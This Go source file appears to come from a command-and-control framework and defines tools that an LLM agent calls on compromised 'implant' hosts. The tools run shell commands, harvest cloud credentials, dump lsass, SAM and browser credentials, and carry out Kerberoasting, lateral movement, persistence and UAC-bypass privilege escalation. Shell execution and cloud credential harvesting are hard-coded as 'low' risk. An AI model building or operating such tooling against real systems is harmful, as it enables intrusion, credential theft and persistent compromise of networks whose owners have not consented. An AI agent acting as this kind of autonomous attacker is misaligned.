package agent

import (
	"encoding/json"
	"fmt"
	"os"

	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
	"github.com/KKingZero/erebus-exploit-framwork/server/approval"
	"google.golang.org/protobuf/proto"
)

const maxUploadSize = 10 << 20 // 10 MB

// RiskNone means no ExecuteTask / no approval.
const RiskNone = "none"

// ToolDef describes one agent-callable action.
type ToolDef struct {
	Name         string
	Description  string
	Risk         string // none, low, high, critical
	TaskType     pb.TaskType
	ModuleName   string // for TASK_MODULE tools
	NeedsSession bool
	BuildData    func(args map[string]any) ([]byte, error)
}

var policy = approval.DefaultPolicy()

// Catalog returns all agent tools.
func Catalog() []ToolDef {
	return []ToolDef{
		{
			Name:        "list_sessions",
			Description: "List all active implant sessions",
			Risk:        RiskNone,
			NeedsSession: false,
		},
		{
			Name:        "get_session",
			Description: "Get details for a session by session_id",
			Risk:        RiskNone,
			NeedsSession: false,
		},
		{
			Name:        "list_loot",
			Description: "List captured loot, optionally filtered by session_id",
			Risk:        RiskNone,
			NeedsSession: false,
		},
		{
			Name:         "run_shell",
			Description:  "Execute a shell command on the implant",
			Risk:         "low",
			TaskType:     pb.TaskType_TASK_SHELL,
			NeedsSession: true,
			BuildData: func(args map[string]any) ([]byte, error) {
				cmd, _ := args["command"].(string)
				if cmd == "" {
					return nil, fmt.Errorf("command required")
				}
				return proto.Marshal(&pb.ShellTask{Command: cmd})
			},
		},
		{
			Name:         "net_ifconfig",
			Description:  "Enumerate network interfaces on the implant",
			Risk:         "low",
			TaskType:     pb.TaskType_TASK_NET_IFCONFIG,
			NeedsSession: true,
			BuildData: func(_ map[string]any) ([]byte, error) {
				return proto.Marshal(&pb.NetIfconfigTask{})
			},
		},
		{
			Name:         "process_list",
			Description:  "List running processes on the implant",
			Risk:         "low",
			TaskType:     pb.TaskType_TASK_PROCESS_LIST,
			NeedsSession: true,
			BuildData: func(_ map[string]any) ([]byte, error) {
				return proto.Marshal(&pb.ProcessListTask{})
			},
		},
		{
			Name:         "portscan",
			Description:  "TCP port scan from the implant (target, ports array)",
			Risk:         "low",
			TaskType:     pb.TaskType_TASK_NET_PORTSCAN,
			NeedsSession: true,
			BuildData: func(args map[string]any) ([]byte, error) {
				target, _ := args["target"].(string)
				if target == "" {
					return nil, fmt.Errorf("target required")
				}
				ports := parseUint32Slice(args["ports"])
				if len(ports) == 0 {
					ports = []uint32{22, 80, 88, 135, 389, 443, 445, 3389, 5985}
				}
				return proto.Marshal(&pb.NetPortscanTask{Target: target, Ports: ports, TimeoutMs: 2000, Threads: 32})
			},
		},
		{
			Name:         "process_kill",
			Description:  "Kill a process on the implant by PID",
			Risk:         "low",
			TaskType:     pb.TaskType_TASK_PROCESS_KILL,
			NeedsSession: true,
			BuildData: func(args map[string]any) ([]byte, error) {
				pid, ok := args["pid"].(float64)
				if !ok || pid <= 0 {
					return nil, fmt.Errorf("pid required")
				}
				return proto.Marshal(&pb.ProcessKillTask{Pid: uint32(pid)})
			},
		},
		{
			Name:         "file_download",
			Description:  "Download a file from the implant (remote_path)",
			Risk:         "low",
			TaskType:     pb.TaskType_TASK_FILE_DOWNLOAD,
			NeedsSession: true,
			BuildData: func(args map[string]any) ([]byte, error) {
				path := str(args, "remote_path")
				if path == "" {
					return nil, fmt.Errorf("remote_path required")
				}
				return proto.Marshal(&pb.FileDownloadTask{RemotePath: path})
			},
		},
		{
			Name:         "file_upload",
			Description:  "Upload a file to the implant (local_path on operator host, remote_path on implant)",
			Risk:         "low",
			TaskType:     pb.TaskType_TASK_FILE_UPLOAD,
			NeedsSession: true,
			BuildData: func(args map[string]any) ([]byte, error) {
				local := str(args, "local_path")
				remote := str(args, "remote_path")
				if local == "" || remote == "" {
					return nil, fmt.Errorf("local_path and remote_path required")
				}
				data, err := os.ReadFile(local)
				if err != nil {
					return nil, fmt.Errorf("read local file: %w", err)
				}
				if len(data) > maxUploadSize {
					return nil, fmt.Errorf("file too large: %d bytes (max %d)", len(data), maxUploadSize)
				}
				return proto.Marshal(&pb.FileUploadTask{RemotePath: remote, Data: data})
			},
		},
		{
			Name:         "cloud_harvest",
			Description:  "Harvest cloud credentials (Azure/AWS/GCP/IMDS) from the implant",
			Risk:         "low",
			TaskType:     pb.TaskType_TASK_MODULE,
			ModuleName:   "cloud",
			NeedsSession: true,
			BuildData: func(args map[string]any) ([]byte, error) {
				provider := str(args, "provider")
				if provider == "" {
					provider = "all"
				}
				method := str(args, "method")
				if method == "" {
					method = "all"
				}
				cfg, err := proto.Marshal(&pb.CloudHarvestConfig{Provider: provider, Method: method})
				if err != nil {
					return nil, err
				}
				return proto.Marshal(&pb.ModuleTask{ModuleName: "cloud", Config: cfg})
			},
		},
		{
			Name:         "screenshot",
			Description:  "Capture a screenshot from the implant",
			Risk:         "low",
			TaskType:     pb.TaskType_TASK_SCREENSHOT,
			NeedsSession: true,
			BuildData: func(args map[string]any) ([]byte, error) {
				task := &pb.ScreenshotTask{}
				if v, ok := args["monitor"].(float64); ok {
					task.Monitor = uint32(v)
				}
				if v, ok := args["quality"].(float64); ok {
					task.Quality = uint32(v)
				}
				return proto.Marshal(task)
			},
		},
		{
			Name:         "socks_start",
			Description:  "Start SOCKS5 proxy on the implant",
			Risk:         "low",
			TaskType:     pb.TaskType_TASK_SOCKS_START,
			NeedsSession: true,
			BuildData: func(args map[string]any) ([]byte, error) {
				port := uint32(1080)
				if v, ok := args["port"].(float64); ok && v > 0 {
					port = uint32(v)
				}
				return proto.Marshal(&pb.SocksStartTask{Port: port})
			},
		},
		{
			Name:         "socks_stop",
			Description:  "Stop SOCKS5 proxy on the implant",
			Risk:         "low",
			TaskType:     pb.TaskType_TASK_SOCKS_STOP,
			NeedsSession: true,
			BuildData: func(_ map[string]any) ([]byte, error) {
				return proto.Marshal(&pb.SocksStopTask{})
			},
		},
		{
			Name:         "ldap_enum",
			Description:  "LDAP/AD enumeration (query_type, domain, target_dc, optional username/password)",
			Risk:         policy.RiskLevel(pb.TaskType_TASK_LDAP_ENUM),
			TaskType:     pb.TaskType_TASK_LDAP_ENUM,
			NeedsSession: true,
			BuildData:    buildLDAPEnum,
		},
		{
			Name:         "kerberoast",
			Description:  "Kerberoast SPNs (domain, target_dc, username, password)",
			Risk:         policy.RiskLevel(pb.TaskType_TASK_KERBEROAST),
			TaskType:     pb.TaskType_TASK_KERBEROAST,
			NeedsSession: true,
			BuildData:    buildKerberoast,
		},
		{
			Name:         "asreproast",
			Description:  "AS-REP roast without preauth (domain, target_dc)",
			Risk:         policy.RiskLevel(pb.TaskType_TASK_ASREPROAST),
			TaskType:     pb.TaskType_TASK_ASREPROAST,
			NeedsSession: true,
			BuildData:    buildASREPRoast,
		},
		{
			Name:         "creds_dump",
			Description:  "Dump credentials (method: lsass, sam, or browser)",
			Risk:         policy.RiskLevel(pb.TaskType_TASK_CREDS_DUMP),
			TaskType:     pb.TaskType_TASK_CREDS_DUMP,
			NeedsSession: true,
			BuildData: func(args map[string]any) ([]byte, error) {
				method, _ := args["method"].(string)
				if method == "" {
					method = "lsass"
				}
				return proto.Marshal(&pb.CredDumpConfig{Method: method})
			},
		},
		{
			Name:         "lateral_move",
			Description:  "Lateral movement (method: wmi|winrm|psexec, target, command, credentials)",
			Risk:         policy.RiskLevel(pb.TaskType_TASK_LATERAL_MOVE),
			TaskType:     pb.TaskType_TASK_LATERAL_MOVE,
			NeedsSession: true,
			BuildData:    buildLateral,
		},
		{
			Name:         "persist",
			Description:  "Install persistence (method: schtask|registry|service, name, payload_path)",
			Risk:         policy.RiskLevel(pb.TaskType_TASK_PERSIST),
			TaskType:     pb.TaskType_TASK_PERSIST,
			NeedsSession: true,
			BuildData:    buildPersist,
		},
		{
			Name:         "privesc",
			Description:  "Privilege escalation (method: token|uac_fodhelper|uac_eventvwr)",
			Risk:         policy.RiskLevel(pb.TaskType_TASK_PRIVESC),
			TaskType:     pb.TaskType_TASK_PRIVESC,
			NeedsSession: true,
			BuildData:    buildPrivesc,
		},
	}
}

// LookupTool finds a tool by name.
func LookupTool(name string) (ToolDef, bool) {
	for _, t := range Catalog() {
		if t.Name == name {
			return t, true
		}
	}
	return ToolDef{}, false
}

// RequiresApproval mirrors server policy for task types and module tools.
func RequiresApproval(tool ToolDef) bool {
	if tool.ModuleName != "" {
		return policy.RequiresModuleApproval(tool.ModuleName)
	}
	return policy.RequiresApproval(tool.TaskType)
}

func buildLDAPEnum(args map[string]any) ([]byte, error) {
	cfg := &pb.LDAPEnumConfig{
		QueryType: str(args, "query_type"),
		Domain:    str(args, "domain"),
		TargetDc:  str(args, "target_dc"),
		Username:  str(args, "username"),
		Password:  str(args, "password"),
	}
	if cfg.QueryType == "" || cfg.Domain == "" || cfg.TargetDc == "" {
		return nil, fmt.Errorf("query_type, domain, and target_dc required")
	}
	return proto.Marshal(cfg)
}

func buildKerberoast(args map[string]any) ([]byte, error) {
	cfg := &pb.KerberoastConfig{
		Domain:   str(args, "domain"),
		TargetDc: str(args, "target_dc"),
		Username: str(args, "username"),
		Password: str(args, "password"),
	}
	if cfg.Domain == "" || cfg.TargetDc == "" || cfg.Username == "" || cfg.Password == "" {
		return nil, fmt.Errorf("domain, target_dc, username, and password required")
	}
	return proto.Marshal(cfg)
}

func buildASREPRoast(args map[string]any) ([]byte, error) {
	cfg := &pb.ASREPRoastConfig{
		Domain:   str(args, "domain"),
		TargetDc: str(args, "target_dc"),
	}
	if cfg.Domain == "" || cfg.TargetDc == "" {
		return nil, fmt.Errorf("domain and target_dc required")
	}
	return proto.Marshal(cfg)
}

func buildLateral(args map[string]any) ([]byte, error) {
	cfg := &pb.LateralMoveConfig{
		Method:        str(args, "method"),
		Target:        str(args, "target"),
		Command:       str(args, "command"),
		Domain:        str(args, "domain"),
		Username:      str(args, "username"),
		Password:      str(args, "password"),
		NtlmHash:      str(args, "ntlm_hash"),
		RemoteBinPath: str(args, "remote_bin_path"),
	}
	if cfg.Method == "" || cfg.Target == "" {
		return nil, fmt.Errorf("method and target required")
	}
	return proto.Marshal(cfg)
}

func buildPersist(args map[string]any) ([]byte, error) {
	cfg := &pb.PersistConfig{
		Method:      str(args, "method"),
		Name:        str(args, "name"),
		PayloadPath: str(args, "payload_path"),
		Trigger:     str(args, "trigger"),
	}
	if cfg.Method == "" {
		return nil, fmt.Errorf("method required")
	}
	return proto.Marshal(cfg)
}

func buildPrivesc(args map[string]any) ([]byte, error) {
	cfg := &pb.PrivescConfig{
		Method:  str(args, "method"),
		Command: str(args, "command"),
	}
	if cfg.Method == "" {
		return nil, fmt.Errorf("method required")
	}
	if v, ok := args["target_pid"].(float64); ok {
		cfg.TargetPid = uint32(v)
	}
	return proto.Marshal(cfg)
}

func str(args map[string]any, key string) string {
	v, _ := args[key].(string)
	return v
}

func parseUint32Slice(v any) []uint32 {
	switch x := v.(type) {
	case []any:
		var out []uint32
		for _, item := range x {
			if f, ok := item.(float64); ok {
				out = append(out, uint32(f))
			}
		}
		return out
	case []uint32:
		return x
	default:
		return nil
	}
}

// ParseToolArgs unmarshals JSON tool arguments from the LLM.
func ParseToolArgs(raw string) (map[string]any, error) {
	if raw == "" {
		return map[string]any{}, nil
	}
	var args map[string]any
	if err := json.Unmarshal([]byte(raw), &args); err != nil {
		return nil, err
	}
	return args, nil
}